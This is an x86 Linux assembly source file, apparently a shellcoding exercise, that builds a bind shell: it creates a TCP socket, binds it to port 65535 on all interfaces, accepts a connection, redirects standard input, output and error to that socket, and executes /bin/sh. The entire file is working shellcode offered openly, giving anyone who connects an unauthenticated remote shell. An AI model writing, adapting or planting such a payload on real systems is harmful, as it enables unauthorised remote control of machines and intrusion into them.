; Filename: SocketServer.nasm
; Author:  citu_adrian@yahoo.com
; Website: 	itblog.adrian.citu.name

global _start
    
section .text

OpenSocket:
     
    ;syscall socketcall  
    xor eax,eax
    xor ebx, ebx
    mov al, 102     
	
   ; build the argument array on the stack
    push ebx ;protocol = 0
    push 1 ; type = SOCK_STREAM (1)
    push 2 ;domain = PF_INET (2)
    mov ecx, esp ;pointer to argument array
	
	mov bl, 01 ;1 = SYS_SOCKET = socket()
	int 0x80
	
	mov esi, eax
	
	call BindSocket
	ret
	
BindSocket:

    ; syscall socketcall
    xor eax, eax
    xor ebx, ebx    
    mov al, 102 
 
    ;build sockaddr struct on the stack
    push ebx          ; INADDR_ANY = 0
    push word 0xffff  ; PORT = 65535
    push word 2       ; AF_INET = 2
    mov ecx, esp      ; pointer to sockaddr struct
   	
   	mov bl, 2   ;2 = SYS_BIND = bind()
   	
   	push BYTE 16      ;sizeof(sockaddr struct) = 16 taken from the
   	                  ;systrace SocketServerCpp version
   	                  
    push ecx          ;sockaddr struct pointer
    push esi          ;socket file descriptor
    mov ecx, esp      ;pointer to argument array
    int 0x80      
 
    call ListenSocket
    
    ret 
    
ListenSocket:
    
    ;syscall socketcall
    xor eax, eax
    xor ebx, ebx	
	mov al, 102  
	mov bl, 4    ;4 = SYS_LISTEN = listen()
    
    ; build the Listen() arguments on the stack
    push 1
    push esi     ; socket file descriptor
    mov ecx, esp ; pointer to argument array
    int 0x80      ; kernel interrupt		
	
	call AcceptSocket

	ret

AcceptSocket:
   
    xor eax, eax
    xor ebx, ebx 
    xor edx, edx
    
    mov al, 102    ;syscall socketcall
    mov bl, 5      ;5 = SYS_ACCEPT = accept()
 
    ; build the accept() arguments on the stack
    push edx                ;socklen = 0
    push edx                ;sockaddr pointer = 0
    push esi                ;socket file descriptor
    mov ecx, esp            ;pointer to argument array
    int 0x80             
    
    mov esi, eax            ;store the new file descriptor
    call Dup2OutInErr

    ret
    
Dup2OutInErr:
	
	xor eax, eax
    xor ebx, ebx 	
    
    ;syscall dup2
    mov al, 63   
    mov ebx, esi
    xor ecx, ecx ;duplicate stdin
    int 0x80 
    
	xor eax, eax
    xor ebx, ebx
    mov al, 63   ;syscall dup2
    mov ebx, esi
    inc ecx      ;duplicate stdout, ebx still holds the socket fd
    int 0x80  
    
    xor eax, eax
    xor ebx, ebx
    mov al, 63    ;syscall dup2
    mov ebx, esi
    inc ecx
    inc ecx      ;duplicate stdout, ebx still holds the socket fd
    int 0x80  
    
    call ExecuteBinSh
    ret

ExecuteBinSh:
    
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
	
    push eax        ;null bytes
    push 0x68732f2f ;//sh
    push 0x6e69622f ;/bin
    mov ebx, esp    ;load address of /bin/sh
     
    push eax ;set argument to 0x0
	mov ecx, esp ;save the pointer to argument envp
 
	push eax ;set argument to 0x0
	mov edx, esp ;save the pointer to argument ptr
    
    mov al, 11 ;syscall execve
    int 0x80
 
    ret

_start:
    call OpenSocket
    
    
     
